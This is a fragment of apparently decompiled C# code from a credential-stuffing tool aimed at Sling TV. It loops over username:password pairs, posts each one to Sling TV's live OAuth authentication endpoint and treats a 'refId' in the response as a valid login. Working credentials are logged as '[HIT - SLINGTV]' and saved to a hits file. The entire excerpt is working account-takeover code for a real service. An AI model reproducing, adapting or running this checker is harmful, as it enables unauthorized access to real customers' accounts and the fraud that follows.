        ...
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              ...
              string str1 = "{\"username\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\",\"clientId\":\"ott_agentless_idp_client\"}";
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              string str2 = httpRequest.Post("https://ms.p.sling.com/sling-api/oauth-helper/alpha/authenticate", str1, "application/json").ToString();
              if (!str2.Contains("Invalid User Credentials"))
              {
                if (str2.Contains("refId"))
                {
                  ++mainmenu.hits;
                  if (mainmenu.p1 == "2")
                    Colorful.Console.WriteLine("[HIT - SLINGTV] " + s[0] + ":" + s[1], Color.Green);
                  Export.AsResult("/SlingTV_hits", s[0] + ":" + s[1]);
                  return false;
                }
                break;
              }
